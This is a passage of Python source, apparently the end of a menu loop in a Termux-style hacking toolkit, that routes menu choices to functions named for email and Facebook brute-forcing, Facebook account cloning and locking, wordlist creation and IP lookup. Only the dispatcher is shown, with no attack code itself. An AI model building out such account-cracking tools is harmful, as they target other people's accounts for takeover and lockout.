		slp(1)
		email_brute_force()
	elif menu_inp in ["02","2"]:
		facebook_brute_force()
	elif menu_inp in ["03","3"]:
		hacking_x()
	elif menu_inp in ["04","4"]:
		hacktool()
	elif menu_inp in ["05","5"]:
		fb_clone()
	elif menu_inp in ["06","6"]:
		webheader()
	elif menu_inp in ["07","7"]:
		createWordList()
	elif menu_inp in ["08","8"]:
		fb_lock()
	elif menu_inp in ["09","9"]:
		search_url_x()
	elif menu_inp in ["10"]:
		ip_info()
	elif menu_inp in ["11"]:
		kali_nethunter()
	elif menu_inp in ["12"]:
		basic_termux()
	else:
		slp(1)
		menu()

if __name__ == "__main__":
	menu()